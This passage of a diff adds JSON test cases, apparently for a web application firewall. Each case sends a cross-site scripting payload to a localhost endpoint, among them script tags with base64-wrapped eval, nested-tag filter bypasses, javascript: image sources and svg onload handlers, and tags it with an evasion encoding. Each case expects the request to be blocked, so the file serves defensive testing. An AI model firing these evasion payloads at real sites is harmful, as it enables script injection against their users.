+    }
+  },
+  {
+    "id": "xss-0065",
+    "class": "xss",
+    "name": "XSS query:name [double-urlencode]",
+    "description": "Cross-site scripting via query:name: <script>eval(atob('YWxlcnQoMSk='))</scri",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=%253Cscript%253Eeval%2528atob%2528%2527YWxlcnQoMSk%253D%2527%2529%2529%253C%252Fscript%253E",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0066",
+    "class": "xss",
+    "name": "XSS body:comment [double-urlencode]",
+    "description": "Cross-site scripting via body:comment: <script>eval(atob('YWxlcnQoMSk='))</scri",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"<script>eval(atob('YWxlcnQoMSk='))</script>\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0067",
+    "class": "xss",
+    "name": "XSS body:display_name [double-urlencode]",
+    "description": "Cross-site scripting via body:display_name: <script>eval(atob('YWxlcnQoMSk='))</scri",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/api/profile",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"display_name\": \"<script>eval(atob('YWxlcnQoMSk='))</script>\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0068",
+    "class": "xss",
+    "name": "XSS body:preferences [mixed-case]",
+    "description": "Cross-site scripting via body:preferences: <script>eval(atob('YWxlcnQoMSk='))</scri",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:mixed-case",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/user/settings",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"preferences\": {\"notifications\": \"<script>eval(atob('YWxlcnQoMSk='))</script>\"}}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0069",
+    "class": "xss",
+    "name": "XSS query:name [double-urlencode]",
+    "description": "Cross-site scripting via query:name: <scr<script>ipt>alert(1)</scr</script>ip",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=%253Cscr%253Cscript%253Eipt%253Ealert%25281%2529%253C%252Fscr%253C%252Fscript%253Eipt%253E",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0070",
+    "class": "xss",
+    "name": "XSS body:comment [raw]",
+    "description": "Cross-site scripting via body:comment: <scr<script>ipt>alert(1)</scr</script>ip",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"<scr<script>ipt>alert(1)</scr</script>ipt>\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0071",
+    "class": "xss",
+    "name": "XSS body:display_name [mixed-case]",
+    "description": "Cross-site scripting via body:display_name: <scr<script>ipt>alert(1)</scr</script>ip",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:mixed-case",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/api/profile",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"display_name\": \"<scr<script>ipt>alert(1)</scr</script>ipt>\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0072",
+    "class": "xss",
+    "name": "XSS body:preferences [urlencode]",
+    "description": "Cross-site scripting via body:preferences: <scr<script>ipt>alert(1)</scr</script>ip",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/user/settings",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"preferences\": {\"notifications\": \"<scr<script>ipt>alert(1)</scr</script>ipt>\"}}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0073",
+    "class": "xss",
+    "name": "XSS query:name [urlencode]",
+    "description": "Cross-site scripting via query:name: <IMG SRC=`javascript:alert(1)`>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=%3CIMG%20SRC%3D%60javascript%3Aalert%281%29%60%3E",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0074",
+    "class": "xss",
+    "name": "XSS body:comment [raw]",
+    "description": "Cross-site scripting via body:comment: <IMG SRC=`javascript:alert(1)`>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"<IMG SRC=`javascript:alert(1)`>\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0075",
+    "class": "xss",
+    "name": "XSS body:display_name [mixed-case]",
+    "description": "Cross-site scripting via body:display_name: <IMG SRC=`javascript:alert(1)`>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:mixed-case",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/api/profile",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"display_name\": \"<IMG SRC=`javascript:alert(1)`>\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0076",
+    "class": "xss",
+    "name": "XSS body:preferences [double-urlencode]",
+    "description": "Cross-site scripting via body:preferences: <IMG SRC=`javascript:alert(1)`>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/user/settings",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"preferences\": {\"notifications\": \"<IMG SRC=`javascript:alert(1)`>\"}}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0077",
+    "class": "xss",
+    "name": "XSS query:name [raw]",
+    "description": "Cross-site scripting via query:name: <svg/onload=alert`1`>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=<svg/onload=alert`1`>",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0078",
+    "class": "xss",
+    "name": "XSS body:comment [double-urlencode]",
+    "description": "Cross-site scripting via body:comment: <svg/onload=alert`1`>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"<svg/onload=alert`1`>\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0079",
+    "class": "xss",
+    "name": "XSS body:display_name [urlencode]",
+    "description": "Cross-site scripting via body:display_name: <svg/onload=alert`1`>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/api/profile",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"display_name\": \"<svg/onload=alert`1`>\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0080",
+    "class": "xss",
+    "name": "XSS body:preferences [raw]",
+    "description": "Cross-site scripting via body:preferences: <svg/onload=alert`1`>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/user/settings",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"preferences\": {\"notifications\": \"<svg/onload=alert`1`>\"}}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  }
+]
